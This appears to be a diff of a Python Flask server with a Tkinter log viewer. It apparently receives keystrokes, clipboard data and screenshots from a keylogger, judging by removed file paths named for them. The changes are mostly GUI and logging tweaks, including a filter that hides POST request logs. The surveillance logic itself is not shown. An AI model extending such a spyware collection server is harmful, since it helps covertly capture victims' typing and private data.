@@ -1,4 +1,3 @@
-2024-09-07 02:54:01,443 - INFO - 192.168.43.245 - - [07/Sep/2024 02:54:01] "POST / HTTP/1.1" 200 -
 import threading
 import base64
 import json
@@ -13,32 +12,39 @@ from tkinter import scrolledtext, ttk
 app = Flask(__name__)
 
 # Configure logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger()
-
-# File paths and directories
-keystrokes_file_path = 'saved_keystrokes.txt'
-clipboard_file_path = 'saved_clipboard.txt'
-screenshots_dir = 'screenshots'
-
-# Create screenshots directory if it doesn't exist
-os.makedirs(screenshots_dir, exist_ok=True)
-
-# Flag for logging clipboard data
-show_clipboard_in_logs = True
+logger.setLevel(logging.INFO)  # Set logging level to INFO
 
 class GUIHandler(logging.Handler):
     def __init__(self, log_widget):
         super().__init__()
         self.log_widget = log_widget
+        self.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+        self.setLevel(logging.INFO)
 
     def emit(self, record):
         try:
             msg = self.format(record)
-            self.log_widget.insert(tk.END, msg + '\n')
+            level = record.levelname
+            if level == "INFO":
+                color = "black"
+            elif level == "ERROR":
+                color = "red"
+            elif level == "WARNING":
+                color = "orange"
+            else:
+                color = "black"
+
+            # Insert the message with color formatting
+            self.log_widget.insert(tk.END, msg + '\n', level)
             self.log_widget.yview(tk.END)
         except Exception:
             self.handleError(record)
+
+class FilterFlaskLogs(logging.Filter):
+    def filter(self, record):
+        # Filter out records that contain HTTP request log messages
+        return not ("POST / HTTP/1.1" in record.getMessage())
 
 @app.route('/', methods=['POST'])
 def handle_post():
@@ -94,7 +100,7 @@ class ServerGUI:
     def __init__(self, root):
         self.root = root
         root.title("Interactive Flask Server GUI")
-        root.geometry("600x400")
+        root.geometry("800x600")
 
         # Notebook (Tabs)
         self.notebook = ttk.Notebook(root)
@@ -104,14 +110,15 @@ class ServerGUI:
         self.log_frame = ttk.Frame(self.notebook)
         self.notebook.add(self.log_frame, text="Logs")
 
-        self.log_text = scrolledtext.ScrolledText(self.log_frame, width=70, height=20, wrap=tk.WORD)
+        self.log_text = scrolledtext.ScrolledText(self.log_frame, width=90, height=30, wrap=tk.WORD, bg='black', fg='white')
         self.log_text.pack(padx=10, pady=10, fill='both', expand=True)
+        self.log_text.tag_configure("INFO", foreground="black")
+        self.log_text.tag_configure("WARNING", foreground="orange")
+        self.log_text.tag_configure("ERROR", foreground="red")
 
         # Set up GUI logging handler
         self.gui_handler = GUIHandler(self.log_text)
-        self.gui_handler.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        self.gui_handler.setFormatter(formatter)
+        self.gui_handler.addFilter(FilterFlaskLogs())
         logger.addHandler(self.gui_handler)  # Add the GUI handler to the root logger
 
         # Control Tab
